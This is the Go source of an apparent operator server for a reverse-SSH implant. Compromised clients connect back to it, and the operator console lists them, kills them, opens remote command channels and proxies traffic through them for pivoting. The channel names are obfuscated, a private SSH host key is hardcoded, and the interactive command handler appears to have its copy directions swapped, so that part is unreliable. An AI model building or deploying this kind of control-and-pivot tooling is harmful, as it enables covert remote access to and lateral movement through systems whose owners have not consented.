package main

import (
	"bufio"
	"fmt"
	"github.com/olekukonko/tablewriter"
	"golang.org/x/crypto/ssh"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var mutex = &sync.Mutex{}

const (
	CHAN_FORWARD   = "RbgEySPMPi"
	CHAN_HEARTBEAT = "uSYeIbUQoR"
	CHAN_COMMAND   = "rIHqXLCqRN"
	COMMAND_KILL   = "aAjcDqEIvI"
	COMMAND_CMD    = "aAjkkqEIvI"
)

type Config struct {
	Host string
	Port string
	User string
	Pwd  string
}

func (c *Config) String() string {
	return fmt.Sprintf("%s:%s", c.Host, c.Port)
}

type Session struct {
	SessionId    int
	sshConn      *ssh.ServerConn
	Disconnected bool
	Tag          string
}

type Server struct {
	SSHServerConfig   *Config
	ProxyServerConfig *Config
	Sessions          []Session
	CurrentSessionId  int
	LastSessionId     int
}

func (s *Server) startProxy() {
	listener, err := net.Listen("tcp", s.ProxyServerConfig.String())
	if err != nil {
		panic(1)
	}
	defer listener.Close()
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		go s.forward(conn)
	}
}

func (s *Server) startSSHServer() {
	config := &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if c.User() == s.SSHServerConfig.User && string(pass) == s.SSHServerConfig.Pwd {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q, %s", c.User(), c.RemoteAddr())
		},
	}
	privateBytes := `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvD5LQlm7VcsUdcRX774oxbzKkJ6aYZuFqRxY8huvarQ9dP0Wo0as
6cYnZdC+sTXONeYLtHzAsT/jDbmZ6jghEZCtDO5g3JFkWX0KJAmGi8Fwbp7oDcWJ+DjjR4
ivcC2FXzoq8c1adVh1+/JBr5jpc2yjv2++fFjVztDmR0Kw0JgtYNbAU/FvREKJjZtD1FQ7
1Jdic1q/u0SPAQSDqC1UgcscZqMAnBgxztvy1pPn1TY2eQbRVa0lNaA58sEBEI0nKhBuS7
yk3Mff2kjqT8OOk6O1KGcP5GQVj6Y/PLj44A6XpWnisdACli4r/uSHIkOmIa+xHeWXQQQg
caCSHyIxFwAAA8AVVir0FVYq9AAAAAdzc2gtcnNhAAABAQC8PktCWbtVyxR1xFfvvijFvM
qQnpphm4WpHFjyG69qtD10/RajRqzpxidl0L6xNc415gu0fMCxP+MNuZnqOCERkK0M7mDc
kWRZfQokCYaLwXBunugNxYn4OONHiK9wLYVfOirxzVp1WHX78kGvmOlzbKO/b758WNXO0O
ZHQrDQmC1g1sBT8W9EQomNm0PUVDvUl2JzWr+7RI8BBIOoLVSByxxmowCcGDHO2/LWk+fV
NjZ5BtFVrSU1oDnywQEQjScqEG5LvKTcx9/aSOpPw46To7UoZw/kZBWPpj88uPjgDpelae
Kx0AKWLiv+5IciQ6Yhr7Ed5ZdBBCBxoJIfIjEXAAAAAwEAAQAAAQEAqJRVC7eWWC/FQ+4x
Hke69dKrybXv5cfEfH0hfriicLm3bASXeGN7yOOnNrwpekQIRyachudOHa5sJUd4+lOH8d
YR08nLPtyJ9MZRBZLuRkxW5woyINsuQviXOeHD039AuNY7zU4tW3d8OcRrZNlZAABj6LYm
7e8UkuFryJeGB1clGP4nCadhls+oWtHbQQ7CP3pn4xvO/A5SBYRMeKnW4kpSC/leETVFKE
S34JkmqWQClOwprjGnQ/lsBYkmLyfeW93VM0udA8jY8sknBLyRCIcEaKGGZpAPUTmITK6j
qOZLy5m4rQOGlZefklYXfglGaCgtlDRJcdlpXQwRfFrZAQAAAIA1yji1hPUvwkkwFGgkVY
d9QrWfiNYv/vbIScpq0TXLFKF2knb3rJDsl2DClUMaC7MLHUmS08Xo1ntUofOqhoBrcbu3
+peSRI0GusDBIuribdoaAGW3ftnVg0vcpipUq3E9a8bANoIuzIbWHBDVlx7O87UVXV85HJ
Iw69PjoWGiqAAAAIEA90sqhw58Z4J5eWr20SrReVcd4FDK0qo1qcxi5rY1oZgnwKkwvfR6
TtCiuXBlZiS0Wqo5oU+YLpzY2d3ORdOgp2U1UW3d9PgD3N4oujaHa2yDuZtXTqd9pxcidb
0BtVrMBx5b4e+L4iAzT8Zs4eFqsoQMAwAGwuLlhulF1/BUXIEAAACBAMLe6cyr4BlY7iw4
E1IkB7PYsNCRMC3d1ODaayj6Oj6w8lGtDqCY5x/hvuaHBHLf1aLod7XpsHXdCvLiOCjqMD
6oIeepGe6zwtpClPas9FEEXGcmbZPdo+I3CAW3o53Y5xFeHv23J9nP1Asqxu1FWHRiPegi
03fxvekB6qkv8yGXAAAACmN5Y3JhY2suaW8=
-----END OPENSSH PRIVATE KEY-----
	`
	private, err := ssh.ParsePrivateKey([]byte(privateBytes))
	if err != nil {
		panic("Failed to parse private key")
	}
	config.AddHostKey(private)

	listener, err := net.Listen("tcp", s.SSHServerConfig.String())
	if err != nil {
		panic("Canot start ssh server")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept incoming connection (%s)", err)
			continue
		}

		sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
		if err != nil {
			log.Printf("Failed to handshake (%s)", err)
			continue
		}
		sess := Session{
			SessionId:    s.LastSessionId + 1,
			sshConn:      sshConn,
			Disconnected: false,
		}
		mutex.Lock()
		s.LastSessionId += 1
		if s.CurrentSessionId == -1 {
			s.CurrentSessionId = sess.SessionId
		}
		s.Sessions = append(s.Sessions, sess)
		mutex.Unlock()
		log.Printf("New client from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())
		go ssh.DiscardRequests(reqs)
		go s.keepAlive(sess.SessionId)
		go handleChannels(chans)
	}
}

func (s *Server) keepAlive(id int) {
	kChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_HEARTBEAT, []byte(s.SSHServerConfig.String()))
	if err != nil {
		fmt.Println(err.Error())
		s.Sessions[id].Disconnected = true
		return
	}
	r := bufio.NewReader(kChan)
	tag := make([]byte, 256)
	n, err := r.Read(tag)
	if err != nil {
		mutex.Lock()
		s.Sessions[id].Disconnected = true
		if s.CurrentSessionId == id {
			s.CurrentSessionId = -1
		}
		mutex.Unlock()
		return
	}
	mutex.Lock()
	s.Sessions[id].Tag = string(tag[:n])
	mutex.Unlock()
	for {
		time.Sleep(10 * time.Second)
		_, err := kChan.Write([]byte("ping"))
		if err != nil {
			mutex.Lock()
			s.Sessions[id].Disconnected = true
			if s.CurrentSessionId == id {
				s.CurrentSessionId = -1
			}
			mutex.Unlock()
			return
		}
	}
}

func handleChannels(chans <-chan ssh.NewChannel) {
	for newChannel := range chans {
		go handleChannel(newChannel)
	}
}

func handleChannel(newChannel ssh.NewChannel) {

	_, requests, err := newChannel.Accept()
	if err != nil {
		log.Printf("could not accept channel (%s)", err)
		return
	}

	chanType := newChannel.ChannelType()
	extraData := newChannel.ExtraData()

	log.Printf("open channel [%s] '%s'", chanType, extraData)
	go ssh.DiscardRequests(requests)
}

func (s *Server) forward(conn net.Conn) {
	mutex.Lock()
	if s.CurrentSessionId == -1 {
		mutex.Unlock()
		return
	}
	mutex.Unlock()
	newChan, _, err := s.Sessions[s.CurrentSessionId].sshConn.OpenChannel(CHAN_FORWARD, []byte(s.SSHServerConfig.String()))
	if err != nil {
		return
	}
	go func() {
		defer conn.Close()
		defer newChan.Close()
		io.Copy(conn, newChan)
	}()
	go func() {
		defer conn.Close()
		defer newChan.Close()
		io.Copy(newChan, conn)
	}()
}

func main() {
	if len(os.Args) != 7 {
		fmt.Println("Usage: ./server sshAddr sshPort  sshUser sshPassword proxyAddr proxyPort")
		fmt.Println("Ex: ./server.elf 0.0.0.0 2222 userssh passssh 0.0.0.0 8080")
		return
	}

	s := Server{
		SSHServerConfig: &Config{
			Host: os.Args[1],
			Port: os.Args[2],
			User: os.Args[3],
			Pwd:  os.Args[4],
		},
		ProxyServerConfig: &Config{
			Host: os.Args[5],
			Port: os.Args[6],
		},
		CurrentSessionId: -1,
		LastSessionId:    -1,
	}
	go s.startSSHServer()
	go s.startProxy()

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("~#:")
		cmdraw, _ := reader.ReadString('\n')
		cmd := strings.Split(strings.TrimSuffix(cmdraw, "\n"), " ")
		if cmd[0] == "show" {
			datas := [][]string{}
			for _, session := range s.Sessions {
				if session.Disconnected {
					continue
				}
				data := []string{strconv.Itoa(session.SessionId), session.sshConn.RemoteAddr().String(), session.Tag}
				datas = append(datas, data)
			}
			table := tablewriter.NewWriter(os.Stdout)
			table.SetHeader([]string{"Id", "Address", "Tag"})
			for _, v := range datas {
				table.Append(v)
			}
			table.Render()
			mutex.Lock()
			fmt.Println("current session: " + strconv.Itoa(s.CurrentSessionId))
			mutex.Unlock()
			continue
		}
		if cmd[0] == "use" {
			if len(cmd) == 2 {
				if id, err := strconv.Atoi(cmd[1]); err == nil {
					if id <= s.LastSessionId && id > -2 {
						if s.Sessions[id].Disconnected {
							fmt.Println("that session was disconnected")
							continue
						}
						mutex.Lock()
						s.CurrentSessionId = id
						mutex.Unlock()
					}
				}
			}
			continue
		}
		if cmd[0] == "kill" {
			if len(cmd) == 2 {
				if id, err := strconv.Atoi(cmd[1]); err == nil {
					if id <= s.LastSessionId && id > -1 {
						if s.Sessions[id].Disconnected {
							fmt.Println("that session was disconnected")
							continue
						}
						cmdChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_COMMAND, []byte(s.SSHServerConfig.String()))
						if err == nil {
							cmdChan.Write([]byte(COMMAND_KILL))
						} else {
							fmt.Println(err.Error())
						}
					}
				}
			}
			continue
		}
		if cmd[0] == "cmd" {
			if len(cmd) == 2 {
				if id, err := strconv.Atoi(cmd[1]); err == nil {
					if id <= s.LastSessionId && id > -1 {
						if s.Sessions[id].Disconnected {
							fmt.Println("that session was disconnected")
							continue
						}
						cmdChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_COMMAND, []byte(s.SSHServerConfig.String()))
						if err == nil {
							cmdChan.Write([]byte(COMMAND_CMD))
						} else {
							fmt.Println(err.Error())
							continue
						}
						var chanExit = make(chan int)
						go func() {
							defer cmdChan.Close()
							io.Copy(os.Stdin, cmdChan)
							chanExit <- 1
						}()
						go func() {
							defer cmdChan.Close()
							io.Copy(cmdChan, os.Stdout)
							chanExit <- 1
						}()
						<-chanExit
					}
				}
			}
			continue
		}
	}
}
